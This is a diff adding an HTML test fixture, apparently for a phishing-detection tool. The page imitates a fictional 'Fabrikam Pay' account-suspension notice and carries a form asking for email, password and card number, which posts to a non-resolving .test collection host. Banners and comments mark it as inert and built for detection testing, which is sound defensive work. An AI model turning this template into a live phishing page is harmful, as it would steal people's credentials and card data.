@@ -1,0 +1,50 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="robots" content="noindex, nofollow">
+<title>Fabrikam Pay — Confirm Your Identity (CyberArmor test fixture)</title>
+<style>
+  .ca-disclaimer {
+    background: #b30000; color: #fff; padding: 12px 16px; font-family: sans-serif;
+    font-size: 14px; font-weight: bold; text-align: center;
+  }
+</style>
+</head>
+<body>
+<div class="ca-disclaimer">
+  ⚠ CYBERARMOR URL TRUST GATE TEST FIXTURE — NOT A REAL PAYMENT SITE.
+  "Fabrikam Pay" is a fictional company. Do NOT enter real card or account
+  details. This page exists only to demonstrate brand-impersonation /
+  credential-harvest detection.
+</div>
+
+<h1>Fabrikam Pay</h1>
+<h2>Your account has been limited</h2>
+<p>We detected unusual activity on your Fabrikam Pay account. To restore full
+   access, please confirm your identity within 24 hours or your account will be
+   permanently suspended.</p>
+
+<!--
+  INERT BY DESIGN. The form posts to a .test hostname, which by RFC 6761 never
+  resolves in the public DNS. It cannot collect or transmit anything. Do not
+  change this to a resolvable endpoint.
+-->
+<form action="https://account-verify.fabrikam-pay.test/collect" method="post">
+  <label>Email or mobile number
+    <input type="email" name="email" autocomplete="username" required>
+  </label>
+  <label>Password
+    <input type="password" name="password" autocomplete="current-password" required>
+  </label>
+  <label>Card number
+    <input type="text" name="cc" inputmode="numeric" required>
+  </label>
+  <button type="submit">Confirm identity and restore access</button>
+</form>
+
+<p>Log in to your Fabrikam Pay account to verify your billing information and
+   avoid suspension. This is a fictional security notice for detection testing —
+   Fabrikam is a fictional company name reserved for documentation and testing.</p>
+</body>
+</html>
